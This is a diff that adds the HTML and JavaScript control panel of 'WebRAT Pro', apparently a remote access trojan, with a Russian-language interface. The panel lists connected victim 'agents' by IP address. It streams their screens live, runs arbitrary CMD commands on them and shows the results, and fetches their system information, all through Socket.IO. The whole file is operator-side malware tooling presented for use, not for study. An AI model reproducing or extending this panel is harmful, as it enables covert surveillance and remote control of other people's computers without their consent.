@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebRAT Pro</title>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <style>
+        body { font-family: Arial; background: #1e1e2e; color: white; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 10px; border: 1px solid #444; text-align: left; }
+        th { background: #2d2d44; }
+        .btn { background: #4CAF50; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 4px; margin: 2px; font-size: 12px;}
+        .btn:hover { opacity: 0.8; }
+        .btn-cmd { background: #2196F3; }
+        .btn-info { background: #FF9800; }
+        #viewer { margin-top: 20px; display: none; background: #111; padding: 15px; border-radius: 8px; }
+        img { width: 100%; max-width: 800px; border: 1px solid #555; display: block; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; }
+        .modal-content { background: #2d2d44; margin: 10% auto; padding: 20px; width: 400px; border-radius: 8px; }
+        .modal-content input { width: 100%; padding: 8px; margin: 10px 0; }
+        .modal-content button { float: right; }
+        #cmdOutput { background: #000; color: lime; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; margin-top: 10px; border: 1px solid #555;}
+    </style>
+</head>
+<body>
+    <h1>WebRAT Pro - Управление</h1>
+    <p>Подключенные агенты:</p>
+    <table>
+        <thead><tr><th>IP Агента</th><th>Действия</th></tr></thead>
+        <tbody id="agentList"></tbody>
+    </table>
+
+    <div id="viewer">
+        <h2>Экран: <span id="viewingUser"></span></h2>
+        <img id="screenImg" src="" />
+    </div>
+
+    <div id="cmdModal" class="modal">
+        <div class="modal-content">
+            <h3>Командная строка (CMD) <span id="cmdTargetIp" style="font-size:14px; color: #aaa;"></span></h3>
+            <input type="text" id="cmdInput" placeholder="Введите команду (например: ipconfig, dir)" />
+            <button class="btn btn-cmd" onclick="sendCommand()">Выполнить</button>
+            <button class="btn" style="background: #f44336; float: right;" onclick="closeCmd()">Закрыть</button>
+            <div id="cmdOutput">Ожидание команды...</div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let currentTarget = null;
+        let currentCmdTarget = null;
+
+        socket.on('update_user_list', (agents) => {
+            const list = document.getElementById('agentList');
+            list.innerHTML = '';
+            agents.forEach(ip => {
+                const row = `<tr>
+                    <td>${ip}</td>
+                    <td>
+                        <button class="btn" onclick="viewScreen('${ip}')">Экран</button>
+                        <button class="btn btn-cmd" onclick="openCmd('${ip}')">CMD</button>
+                        <button class="btn btn-info" onclick="getSysInfo('${ip}')">Инфо</button>
+                    </td>
+                </tr>`;
+                list.innerHTML += row;
+            });
+        });
+
+        function viewScreen(ip) {
+            currentTarget = ip;
+            document.getElementById('viewer').style.display = 'block';
+            document.getElementById('viewingUser').innerText = ip;
+            document.getElementById('screenImg').src = '';
+            socket.emit('request_view', { ip: ip });
+        }
+
+        socket.on('display_screen', (data) => {
+            if (currentTarget === data.ip) {
+                document.getElementById('screenImg').src = 'data:image/jpeg;base64,' + data.image;
+                setTimeout(() => {
+                    if (currentTarget === data.ip) socket.emit('request_view', { ip: currentTarget });
+                }, 400);
+            }
+        });
+
+        function openCmd(ip) {
+            currentCmdTarget = ip;
+            document.getElementById('cmdModal').style.display = 'block';
+            document.getElementById('cmdTargetIp').innerText = `(${ip})`;
+            document.getElementById('cmdOutput').innerText = "Готов к выполнению...";
+            document.getElementById('cmdInput').value = "";
+        }
+
+        function closeCmd() {
+            document.getElementById('cmdModal').style.display = 'none';
+        }
+
+        function sendCommand() {
+            const cmd = document.getElementById('cmdInput').value;
+            if (!cmd) return;
+            document.getElementById('cmdOutput').innerText = "Выполнение команды...";
+            socket.emit('execute_command', { ip: currentCmdTarget, command: cmd });
+        }
+
+        socket.on('display_command_result', (data) => {
+            if (data.ip === currentCmdTarget) {
+                document.getElementById('cmdOutput').innerText = data.result || "[Пустой вывод]";
+            }
+        });
+
+        function getSysInfo(ip) {
+            socket.emit('get_sysinfo', { ip: ip });
+        }
+
+        socket.on('display_sysinfo', (data) => {
+            if (data.ip === currentTarget) {
+                alert(`Системная информация для ${data.ip}:\n\n${data.info}`);
+            } else {
+                alert(`Инфо для ${data.ip}:\n\n${data.info}`);
+            }
+        });
+
+        socket.on('error_msg', (msg) => alert(msg));
+    </script>
+</body>
+</html>
